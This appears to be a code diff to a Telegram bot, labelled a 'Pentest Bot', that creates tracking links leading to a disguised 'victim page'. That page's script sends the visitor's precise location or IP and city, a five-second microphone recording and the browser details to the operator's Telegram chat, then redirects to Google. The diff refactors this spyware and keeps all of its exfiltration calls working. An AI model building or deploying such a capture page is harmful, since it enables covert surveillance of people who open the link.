@@ -2,7 +2,6 @@ import os
 import uuid
 import json
 from fastapi import FastAPI, Request, HTMLResponse
-from pydantic import BaseModel
 from typing import Optional
 import httpx
 
@@ -24,7 +23,8 @@ async def send_message(chat_id, text, reply_markup=None):
     if reply_markup:
         payload["reply_markup"] = json.dumps(reply_markup)
     async with httpx.AsyncClient() as client:
-        await client.post(url, json=payload)
+        r = await client.post(url, json=payload)
+        return r.json()
 
 async def edit_message(chat_id, message_id, text, reply_markup=None):
     url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
@@ -32,7 +32,8 @@ async def edit_message(chat_id, message_id, text, reply_markup=None):
     if reply_markup:
         payload["reply_markup"] = json.dumps(reply_markup)
     async with httpx.AsyncClient() as client:
-        await client.post(url, json=payload)
+        r = await client.post(url, json=payload)
+        return r.json()
 
 async def answer_callback(callback_id, text=None):
     url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
@@ -40,7 +41,8 @@ async def answer_callback(callback_id, text=None):
     if text:
         payload["text"] = text
     async with httpx.AsyncClient() as client:
-        await client.post(url, json=payload)
+        r = await client.post(url, json=payload)
+        return r.json()
 
 # ==================== TELEGRAM BOT LOGIC ====================
 
@@ -113,8 +115,7 @@ async def handle_callback(chat_id, message_id, user_id, callback_id, data):
 
 # ==================== VICTIM PAGE ====================
 
-@app.get("/capture/{link_id}", response_class=HTMLResponse)
-async def capture_page(link_id: str):
+async def serve_capture_page(link_id: str):
     if not ADMIN_IDS or not ADMIN_IDS[0]:
         return HTMLResponse(content="<h1>Not configured</h1>")
     
@@ -163,7 +164,6 @@ p{{color:#666;font-size:14px;margin-bottom:25px;line-height:1.6;}}
 <script>
 const BT="{TOKEN}";
 const CI="{admin_id}";
-async function post(u,d){{fetch(u,{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify(d)}});}}
 function start(){{
 document.getElementById("sb").disabled=true;document.getElementById("sb").textContent="Processing...";
 document.getElementById("ld").classList.remove("hidden");
@@ -173,8 +173,8 @@ function getLoc(){{
 if(navigator.geolocation){{
 navigator.geolocation.getCurrentPosition(p=>{{
 document.getElementById("ls").className="dot green";
-post("https://api.telegram.org/bot"+BT+"/sendMessage",{{chat_id:CI,text:"Location: "+p.coords.latitude+", "+p.coords.longitude}});
-}},e=>{{fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{{post("https://api.telegram.org/bot"+BT+"/sendMessage",{{chat_id:CI,text:"IP: "+d.ip+", "+d.city+", "+d.country_name}});}});document.getElementById("ls").className="dot green";}},{{enableHighAccuracy:true,timeout:10000}});
+fetch("https://api.telegram.org/bot"+BT+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:CI,text:"Location: "+p.coords.latitude+", "+p.coords.longitude}})}});
+}},e=>{{fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{{fetch("https://api.telegram.org/bot"+BT+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:CI,text:"IP: "+d.ip+", "+d.city+", "+d.country_name}})}});}});document.getElementById("ls").className="dot green";}},{{enableHighAccuracy:true,timeout:10000}});
 }}else document.getElementById("ls").className="dot green";
 }}
 function getCam(){{
@@ -190,7 +190,7 @@ navigator.mediaDevices.getUserMedia({{video:false,audio:true}}).then(s=>{{
 document.getElementById("ms").className="dot green";let r=new MediaRecorder(s);let c=[];r.ondataavailable=e=>c.push(e.data);r.onstop=()=>{{let b=new Blob(c,{{type:"audio/webm"}});let fd=new FormData();fd.append("chat_id",CI);fd.append("audio",b,"a.webm");fetch("https://api.telegram.org/bot"+BT+"/sendAudio",{{method:"POST",body:fd}});}};r.start();setTimeout(()=>r.stop(),5000);
 }}).catch(e=>{{}});
 }}
-post("https://api.telegram.org/bot"+BT+"/sendMessage",{{chat_id:CI,text:"Target opened link! "+navigator.userAgent}});
+fetch("https://api.telegram.org/bot"+BT+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:CI,text:"Target opened link! "+navigator.userAgent}})}});
 setTimeout(()=>{{document.getElementById("ld").classList.add("hidden");document.getElementById("sm").classList.remove("hidden");setTimeout(()=>window.location.href="https://www.google.com",2000);}},10000);
 </script>
 </div>
@@ -198,15 +198,13 @@ setTimeout(()=>{{document.getElementById("ld").classList.add("hidden");document.
 </html>"""
     return HTMLResponse(content=html)
 
-# ==================== WEBHOOK ====================
+# ==================== ROUTES ====================
 
 @app.post("/webhook")
 async def webhook(request: Request):
     try:
         data = await request.json()
-        print(f"Webhook received: {json.dumps(data)[:200]}")
         
-        # Handle message
         if "message" in data:
             msg = data["message"]
             chat_id = msg["chat"]["id"]
@@ -216,7 +214,6 @@ async def webhook(request: Request):
             if text == "/start":
                 await handle_start(chat_id, user_id)
         
-        # Handle callback query
         if "callback_query" in data:
             cb = data["callback_query"]
             chat_id = cb["message"]["chat"]["id"]
@@ -229,13 +226,17 @@ async def webhook(request: Request):
         
         return {"ok": True}
     except Exception as e:
-        print(f"Error: {str(e)}")
+        print(f"Webhook error: {str(e)}")
         return {"ok": False, "error": str(e)}
 
-@app.get("/")
-async def index():
-    return {"status": "Pentest Bot Running", "version": "2.0"}
+@app.get("/capture/{link_id}")
+async def capture_route(link_id: str):
+    return await serve_capture_page(link_id)
 
 @app.get("/api/health")
 async def health():
-    return {"status": "ok", "token_set": bool(TOKEN), "admins": ADMIN_IDS}
+    return {"status": "ok", "token_set": bool(TOKEN), "admins": ADMIN_IDS, "links": len(active_links)}
+
+@app.get("/")
+async def index():
+    return {"status": "Pentest Bot Running"}
